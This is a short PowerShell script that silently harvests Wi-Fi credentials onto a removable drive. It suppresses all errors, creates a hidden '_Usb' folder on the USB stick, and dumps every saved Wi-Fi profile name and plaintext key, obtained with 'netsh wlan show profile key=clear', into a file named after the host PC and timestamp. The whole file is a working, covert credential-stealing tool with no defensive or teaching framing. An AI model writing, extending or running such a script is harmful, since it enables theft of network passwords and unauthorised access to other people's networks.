# Suppress all errors and output
$ErrorActionPreference = "SilentlyContinue"

# Define the USB drive path and hidden directory name
$usbDrive = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE DriveType=2").DriveLetter + "\"
$hiddenDir = "_Usb"
$outputDir = Join-Path -Path $usbDrive -ChildPath $hiddenDir

# Create the hidden directory on the USB drive
if (-not (Test-Path $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    attrib +h $outputDir  # Hide the directory
}

# Get the user's PC name and current date
$userPcName = $env:COMPUTERNAME
$currentDate = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"

# Find the next available file number
$fileNumber = 1
while (Test-Path (Join-Path -Path $outputDir -ChildPath "$userPcName`_$currentDate`_#$fileNumber.txt")) {
    $fileNumber++
}

# Define the output file path
$outputFile = Join-Path -Path $outputDir -ChildPath "$userPcName`_$currentDate`_#$fileNumber.txt"

# Extract Wi-Fi profiles and passwords
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }

foreach ($profile in $wifiProfiles) {
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    if ($password) {
        Add-Content -Path $outputFile -Value "Wi-Fi Name: $profile"
        Add-Content -Path $outputFile -Value "Password: $password"
        Add-Content -Path $outputFile -Value "-----------------------------"
    }
}
